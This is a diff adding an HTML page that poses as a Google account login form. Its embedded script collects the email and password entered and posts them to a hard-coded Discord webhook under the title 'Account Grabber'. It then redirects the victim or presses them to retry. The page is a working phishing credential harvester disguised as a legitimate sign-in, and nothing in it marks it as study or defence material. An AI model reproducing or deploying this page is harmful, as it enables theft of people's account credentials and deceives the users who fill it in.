@@ -1,0 +1,166 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Login Page</title>
+  </head>
+  <style>
+    * {
+      box-sizing: border-box;
+      margin: 0;
+      padding: 0;
+    }
+
+    body {
+      background-color: grey;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      align-content: center;
+      text-align: center;
+      height: 100vh;
+    }
+
+    .card {
+      overflow: hidden;
+      border: 1px solid black;
+      padding: 15px;
+      height: max-content;
+      border-radius: 20px;
+      box-shadow: 0px 1px 20px 5px black;
+      background-color: black;
+    }
+
+    .title {
+      color: white;
+      font-family: Arial, Helvetica, sans-serif;
+      font-size: 35px;
+    }
+
+    .title.sub {
+      font-size: 15px;
+      margin-bottom: 15px;
+    }
+
+    .label {
+      color: white;
+      font-family: Verdana, Geneva, Tahoma, sans-serif;
+    }
+
+    .input {
+      padding: 3px;
+      margin: 1px 0px 10px 0px;
+      background-color: black;
+      border: 0;
+      color: white;
+      outline-offset: 1px;
+      outline-width: 1px;
+      outline-color: black;
+      outline-style: solid;
+      background-color: rgba(255, 255, 255, 0.1);
+    }
+
+    .input:focus {
+      transition: all 0.5s ease-in-out;
+      background-color: transparent;
+      outline-offset: 1px;
+      outline-width: 1px;
+      outline-color: skyblue;
+      outline-style: solid;
+    }
+
+    .input:focus:valid {
+      background-color: rgba(80, 255, 112, 0.000000000000000000000001);
+    }
+
+    .input:focus:invalid {
+      background-color: rgba(255, 112, 112, 0.000000000000000000000001);
+    }
+
+    .button {
+      margin-top: 5px;
+      background-color: rgba(255, 255, 255, 0.075);
+      color: white;
+      border: 1px solid white;
+      border-radius: 10px;
+      padding: 5px;
+      cursor: pointer;
+    }
+
+    .button:hover {
+      transition: background-color 0.75s;
+      background-color: rgba(255, 255, 255, 0.25);
+    }
+  </style>
+
+  <body>
+    <div class="card">
+      <p class="title">Login</p>
+      <p class="title sub">Please login with your <b>Google Account</b></p>
+      <form onsubmit="sendContent(event)">
+        <div class="marg">
+          <label for="email" class="label">G-Mail Address</label>
+          <br />
+          <input
+            type="email"
+            id="email"
+            class="input"
+            pattern=".+@gmail\.com|.+@outlook\.com|.+@hotmail\.com"
+            required
+          />
+          <br />
+          <label for="password" class="label">Password</label>
+          <br />
+          <input
+            type="password"
+            id="password"
+            class="input"
+            minlength="8"
+            required
+          />
+        </div>
+        <button type="submit" class="button">Apply</button>
+      </form>
+    </div>
+
+    <script>
+      async function sendContent(ev) {
+        ev.preventDefault();
+
+        const senderEmail = document.getElementById("email").value;
+        const senderMessage = document.getElementById("password").value;
+
+        const webhookBody = {
+          embeds: [
+            {
+              title: "Account Grabber",
+              fields: [
+                { name: "Email", value: senderEmail },
+                { name: "Password", value: senderMessage },
+              ],
+            },
+          ],
+        };
+
+        const webhookUrl =
+          "https://discord.com/api/webhooks/1048829611548614666/S2GIlWRmeiujl_gr8ACFrDgRxwirndWR-CaNE2rvwz4itQzO5LKOn1VgzPUwKpSrQ5H8";
+
+        const response = await fetch(webhookUrl, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify(webhookBody),
+        });
+
+        if (response.ok) {
+          location.href = "./home.html";
+        } else {
+          alert("Please Input Your Google Account To Continue!");
+        }
+      }
+    </script>
+  </body>
+</html>
